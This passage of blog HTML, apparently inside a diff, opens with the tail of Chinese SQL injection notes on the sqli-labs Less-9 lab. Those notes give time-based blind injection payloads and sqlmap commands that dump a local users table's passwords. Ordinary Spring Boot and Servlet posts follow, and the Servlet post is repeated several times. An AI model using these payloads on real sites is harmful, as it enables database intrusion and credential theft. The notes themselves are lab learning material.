<span class="keyword">if</span>(length(database())=8,<span class="built_in">sleep</span>(2),0)-- -</span><br><span class="line">-------------------------------</span><br><span class="line">判断库名</span><br><span class="line">/Less-9/?<span class="built_in">id</span>=1<span class="string">&#x27; and 1=1 and if(ascii(substr(database(),1,1))=115,sleep(2),0) --+</span></span><br><span class="line"><span class="string">/Less-9/?id=1&#x27;</span> and 1=1  and <span class="keyword">if</span>(ascii(substr(database(),2,1))=101,<span class="built_in">sleep</span>(2),0) --+</span><br><span class="line">------------------------</span><br><span class="line">/Less-9/?<span class="built_in">id</span>=1<span class="string">&#x27; and 1=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit x,y),z,d))=e,sleep(1),0)- --</span></span><br><span class="line"><span class="string">/Less-9/?id=1&#x27;</span> and 1=1 and <span class="keyword">if</span>(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;100,<span class="built_in">sleep</span>(2),1)-- -</span><br><span class="line">------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap</span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli-labs-master(v2.0)/Less-9/?id=1&quot;</span> </span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli-labs-master(v2.0)/Less-9/?id=1&quot;</span> --dbs</span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli-labs-master(v2.0)/Less-9/?id=1&quot;</span> -D security --tables</span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli-labs-master(v2.0)/Less-9/?id=1&quot;</span> -D security -T  <span class="built_in">users</span> --columns</span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli-labs-master(v2.0)/Less-9/?id=1&quot;</span> -D security -T  <span class="built_in">users</span> -C <span class="built_in">id</span>,password,username --dump</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/05/18/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86-junlin623/" data-id="clhrwf8jd001eeksz5qdxfhzm" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Springboot项目搭建及踩坑-junlin623" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/05/18/Springboot%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA%E5%8F%8A%E8%B8%A9%E5%9D%91-junlin623/" class="article-date">
+  <time class="dt-published" datetime="2023-05-17T16:09:35.141Z" itemprop="datePublished">2023-05-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/junlin623/p/17306748.html">https://www.cnblogs.com/junlin623/p/17306748.html</a></p>
+<hr>
+<p>title: ‘Springboot项目搭建及踩坑-junlin623’<br>date: 2023-04-11 16:40:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<h3 id="1-创建项目"><a href="#1-创建项目" class="headerlink" title="1. 创建项目"></a>1. 创建项目</h3><hr>
+<img src="https://img2023.cnblogs.com/blog/2935791/202304/2935791-20230411155308144-1538527053.png" width="60%" >
+
+<p><strong>注意：</strong>加载<code>start.spring.io</code> 网址与网络有关，如果网速比较慢的话将无法加载成功，可以考虑换成阿里（比较旧）：<code>https://start.aliyun.com</code></p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202304/2935791-20230411155442474-446385945.png" width="60%" >
+
+<p><strong>注意：</strong>springboot版本如果3.0以上的，将不支持jdk1.8</p>
+<hr>
+<p>如果是新建project的话一定要记得将项目的maven路径设置为本地的maven路径，否则后面加载依赖会非常慢:</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202304/2935791-20230411160552866-651210796.png" width="40%" >
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202304/2935791-20230411160711375-581570327.png" width="60%" >
+
+
+<hr>
+<p>打开pom.xml文件后会飘红且项目目录都是灰色（表示为普通目录）：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202304/2935791-20230411160839908-108208559.png" width="60%" >
+
+<p>原因是依赖没有加载成功</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202304/2935791-20230411161049311-613585032.png" width="60%" >
+
+
+<p>但是发现maven插件依旧飘红，</p>
+<p>加入一个版本号即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;version&gt;<span class="variable">$&#123;project.parent.version&#125;</span>&lt;/version&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202304/2935791-20230411163215894-1335740959.png" width="60%" >
+
+
+<p>如果此时项目文件还是普通目录，可以右击<code>pom.xml</code>文件选择 <code>Add As Maven Project</code>，重新加载，中间可能会卡，等一会儿就好了</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202304/2935791-20230411163325211-1307369727.png" width="40%" >
+
+
+<h3 id="2-运行测试"><a href="#2-运行测试" class="headerlink" title="2.运行测试"></a>2.运行测试</h3><hr>
+<p>新建一个controller</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TestController.java</span></span><br><span class="line"><span class="keyword">package</span> com.junlin.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>:</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: junlin623</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2023-04-11 16:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(<span class="meta">@PathVariable</span> Integer id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;id =&gt; &quot;</span> + id);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;h1&gt;Hello World&lt;/h1&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202304/2935791-20230411163617670-1370399712.png" widht="40%" >
+
+
+<p>直接运行：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202304/2935791-20230411163719725-1169502646.png" widht="40%" >
+
+
+<img src="https://img2023.cnblogs.com/blog/2935791/202304/2935791-20230411163755956-2032449113.png" widht="40%" >
+
+
+<p>访问 <code>http://localhost:8080/test/1/</code></p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202304/2935791-20230411163836903-278796026.png" widht="60%" >
+
+<p>成功啦~~~</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/05/18/Springboot%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA%E5%8F%8A%E8%B8%A9%E5%9D%91-junlin623/" data-id="clhrwf8j2000zeksz5x0o2hby" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Servlet转发到html页面样式丢失的问题-junlin623" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/05/18/Servlet%E8%BD%AC%E5%8F%91%E5%88%B0html%E9%A1%B5%E9%9D%A2%E6%A0%B7%E5%BC%8F%E4%B8%A2%E5%A4%B1%E7%9A%84%E9%97%AE%E9%A2%98-junlin623/" class="article-date">
+  <time class="dt-published" datetime="2023-05-17T16:09:35.138Z" itemprop="datePublished">2023-05-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/junlin623/p/17030165.html">https://www.cnblogs.com/junlin623/p/17030165.html</a></p>
+<hr>
+<p>title: ‘Servlet转发到html页面样式丢失的问题-junlin623’<br>date: 2023-01-06 13:40:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<p>在做书城项目的注册功能时需要实现: 在web层判断如果注册成功需要转发到注册成功页面regist_success.html</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//调用service将用户信息保存到数据库</span></span><br><span class="line">userService.registerUser(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="literal">null</span>, username, password, email));</span><br><span class="line"><span class="comment">//跳转到注册成功页面</span></span><br><span class="line">request.getRequestDispatcher(<span class="string">&quot;/pages/user/regist_success.html&quot;</span>).forward(request,response);</span><br></pre></td></tr></table></figure>
+
+
+<p>但是转发到regist_success.html页面之后该页面原来的样式也丢失了</p>
+<p>于是为了方面我使用get请求进行测试(浏览器地址栏中直接请求registerServlet：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    request.getRequestDispatcher(<span class="string">&quot;/pages/user/regist_success.html&quot;</span>).forward(request,response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>转发页面的结果如下：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106124600366-97394301.png" width="40%" >
+
+
+<p>这肯定是css样式文件路径的问题：</p>
+<p>查看network中css文件的请求路径：</p>
+<p><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106124844509-69159937.png"></p>
+<p>查看html代码中的请求路径：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../../static/css/style.css&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>对比这三个路径可以发现html文件中的资源请求的相对路径是参照的浏览器地址栏中的地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/book/registerServlet</span><br></pre></td></tr></table></figure>
+
+<p>这里由于服务端Servlet使用的是转发，所以浏览器地址栏中的请求地址没有改变，这也就导致了资源请求路径错误（我们预想注册成功的这个html页面是相对于自己在服务端的路径的）</p>
+<p>项目路径：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106131948246-1211506993.png" width="30%" >
+
+<h4 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h4><ol>
+<li><p>在html的head标签中使用base标签，固定该页面中相对路径的参照路径</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://localhost/book/pages/user /&gt;</span></span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Servlet中使用重定向：这样浏览器中的地址会与重定向的地址相同</p>
+</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    response.sendRedirect(<span class="string">&quot;/book/pages/user/regist_success.html&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>资源路径改为绝对路径（注意：如果是浏览器解析的地址，&#x2F; 表示 <a href="http://ip:port，">http://ip:port，</a> 而在服务端 &#x2F; 表示 <a href="http://ip:port/工程名）">http://ip:port/工程名）</a></li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/book/static/css/style.css&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p><strong>PS</strong>：如果修改之后请求的结果还每个发生变化，要么就是改错了，要么就是浏览器有缓存<a target="_blank" rel="noopener" href="https://www.cnblogs.com/junlin623/p/17030165.html">https://www.cnblogs.com/junlin623/p/17030165.html</a></p>
+<hr>
+<p>title: ‘Servlet转发到html页面样式丢失的问题-junlin623’<br>date: 2023-01-06 13:40:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<p>在做书城项目的注册功能时需要实现: 在web层判断如果注册成功需要转发到注册成功页面regist_success.html</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//调用service将用户信息保存到数据库</span></span><br><span class="line">userService.registerUser(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="literal">null</span>, username, password, email));</span><br><span class="line"><span class="comment">//跳转到注册成功页面</span></span><br><span class="line">request.getRequestDispatcher(<span class="string">&quot;/pages/user/regist_success.html&quot;</span>).forward(request,response);</span><br></pre></td></tr></table></figure>
+
+
+<p>但是转发到regist_success.html页面之后该页面原来的样式也丢失了</p>
+<p>于是为了方面我使用get请求进行测试(浏览器地址栏中直接请求registerServlet：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    request.getRequestDispatcher(<span class="string">&quot;/pages/user/regist_success.html&quot;</span>).forward(request,response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>转发页面的结果如下：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106124600366-97394301.png" width="40%" >
+
+
+<p>这肯定是css样式文件路径的问题：</p>
+<p>查看network中css文件的请求路径：</p>
+<p><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106124844509-69159937.png"></p>
+<p>查看html代码中的请求路径：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../../static/css/style.css&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>对比这三个路径可以发现html文件中的资源请求的相对路径是参照的浏览器地址栏中的地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/book/registerServlet</span><br></pre></td></tr></table></figure>
+
+<p>这里由于服务端Servlet使用的是转发，所以浏览器地址栏中的请求地址没有改变，这也就导致了资源请求路径错误（我们预想注册成功的这个html页面是相对于自己在服务端的路径的）</p>
+<p>项目路径：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106131948246-1211506993.png" width="30%" >
+
+<h4 id="解决方法：-1"><a href="#解决方法：-1" class="headerlink" title="解决方法："></a>解决方法：</h4><ol>
+<li><p>在html的head标签中使用base标签，固定该页面中相对路径的参照路径</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://localhost/book/pages/user /&gt;</span></span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Servlet中使用重定向：这样浏览器中的地址会与重定向的地址相同</p>
+</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    response.sendRedirect(<span class="string">&quot;/book/pages/user/regist_success.html&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>资源路径改为绝对路径（注意：如果是浏览器解析的地址，&#x2F; 表示 <a href="http://ip:port，">http://ip:port，</a> 而在服务端 &#x2F; 表示 <a href="http://ip:port/工程名）">http://ip:port/工程名）</a></li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/book/static/css/style.css&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p><strong>PS</strong>：如果修改之后请求的结果还每个发生变化，要么就是改错了，要么就是浏览器有缓存<a target="_blank" rel="noopener" href="https://www.cnblogs.com/junlin623/p/17030165.html">https://www.cnblogs.com/junlin623/p/17030165.html</a></p>
+<hr>
+<p>title: ‘Servlet转发到html页面样式丢失的问题-junlin623’<br>date: 2023-01-06 13:40:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<p>在做书城项目的注册功能时需要实现: 在web层判断如果注册成功需要转发到注册成功页面regist_success.html</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//调用service将用户信息保存到数据库</span></span><br><span class="line">userService.registerUser(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="literal">null</span>, username, password, email));</span><br><span class="line"><span class="comment">//跳转到注册成功页面</span></span><br><span class="line">request.getRequestDispatcher(<span class="string">&quot;/pages/user/regist_success.html&quot;</span>).forward(request,response);</span><br></pre></td></tr></table></figure>
+
+
+<p>但是转发到regist_success.html页面之后该页面原来的样式也丢失了</p>
+<p>于是为了方面我使用get请求进行测试(浏览器地址栏中直接请求registerServlet：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    request.getRequestDispatcher(<span class="string">&quot;/pages/user/regist_success.html&quot;</span>).forward(request,response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>转发页面的结果如下：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106124600366-97394301.png" width="40%" >
+
+
+<p>这肯定是css样式文件路径的问题：</p>
+<p>查看network中css文件的请求路径：</p>
+<p><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106124844509-69159937.png"></p>
+<p>查看html代码中的请求路径：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../../static/css/style.css&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>对比这三个路径可以发现html文件中的资源请求的相对路径是参照的浏览器地址栏中的地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/book/registerServlet</span><br></pre></td></tr></table></figure>
+
+<p>这里由于服务端Servlet使用的是转发，所以浏览器地址栏中的请求地址没有改变，这也就导致了资源请求路径错误（我们预想注册成功的这个html页面是相对于自己在服务端的路径的）</p>
+<p>项目路径：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106131948246-1211506993.png" width="30%" >
+
+<h4 id="解决方法：-2"><a href="#解决方法：-2" class="headerlink" title="解决方法："></a>解决方法：</h4><ol>
+<li><p>在html的head标签中使用base标签，固定该页面中相对路径的参照路径</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://localhost/book/pages/user /&gt;</span></span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Servlet中使用重定向：这样浏览器中的地址会与重定向的地址相同</p>
+</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    response.sendRedirect(<span class="string">&quot;/book/pages/user/regist_success.html&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>资源路径改为绝对路径（注意：如果是浏览器解析的地址，&#x2F; 表示 <a href="http://ip:port，">http://ip:port，</a> 而在服务端 &#x2F; 表示 <a href="http://ip:port/工程名）">http://ip:port/工程名）</a></li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/book/static/css/style.css&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p><strong>PS</strong>：如果修改之后请求的结果还每个发生变化，要么就是改错了，要么就是浏览器有缓存<a target="_blank" rel="noopener" href="https://www.cnblogs.com/junlin623/p/17030165.html">https://www.cnblogs.com/junlin623/p/17030165.html</a></p>
+<hr>
+<p>title: ‘Servlet转发到html页面样式丢失的问题-junlin623’<br>date: 2023-01-06 13:40:00</p>
+<hr>
+<meta name = "referrer" content = "no-referrer" />
+
+
+
+<p>在做书城项目的注册功能时需要实现: 在web层判断如果注册成功需要转发到注册成功页面regist_success.html</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//调用service将用户信息保存到数据库</span></span><br><span class="line">userService.registerUser(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="literal">null</span>, username, password, email));</span><br><span class="line"><span class="comment">//跳转到注册成功页面</span></span><br><span class="line">request.getRequestDispatcher(<span class="string">&quot;/pages/user/regist_success.html&quot;</span>).forward(request,response);</span><br></pre></td></tr></table></figure>
+
+
+<p>但是转发到regist_success.html页面之后该页面原来的样式也丢失了</p>
+<p>于是为了方面我使用get请求进行测试(浏览器地址栏中直接请求registerServlet：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    request.getRequestDispatcher(<span class="string">&quot;/pages/user/regist_success.html&quot;</span>).forward(request,response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>转发页面的结果如下：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106124600366-97394301.png" width="40%" >
+
+
+<p>这肯定是css样式文件路径的问题：</p>
+<p>查看network中css文件的请求路径：</p>
+<p><img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106124844509-69159937.png"></p>
+<p>查看html代码中的请求路径：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../../static/css/style.css&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>对比这三个路径可以发现html文件中的资源请求的相对路径是参照的浏览器地址栏中的地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/book/registerServlet</span><br></pre></td></tr></table></figure>
+
+<p>这里由于服务端Servlet使用的是转发，所以浏览器地址栏中的请求地址没有改变，这也就导致了资源请求路径错误（我们预想注册成功的这个html页面是相对于自己在服务端的路径的）</p>
+<p>项目路径：</p>
+<img src="https://img2023.cnblogs.com/blog/2935791/202301/2935791-20230106131948246-1211506993.png" width="30%" >
+
+<h4 id="解决方法：-3"><a href="#解决方法：-3" class="headerlink" title="解决方法："></a>解决方法：</h4><ol>
+<li><p>在html的head标签中使用base标签，固定该页面中相对路径的参照路径</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://localhost/book/pages/user /&gt;</span></span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Servlet中使用重定向：这样浏览器中的地址会与重定向的地址相同</p>
+</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    response.sendRedirect(<span class="string">&quot;/book/pages/user/regist_success.html&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>资源路径改为绝对路径（注意：如果是浏览器解析的地址，&#x2F; 表示 <a href="http://ip:port，">http://ip:port，</a> 而在服务端 &#x2F; 表示 <a href="http://ip:port/工程名）">http://ip:port/工程名）</a></li>
+</ol>
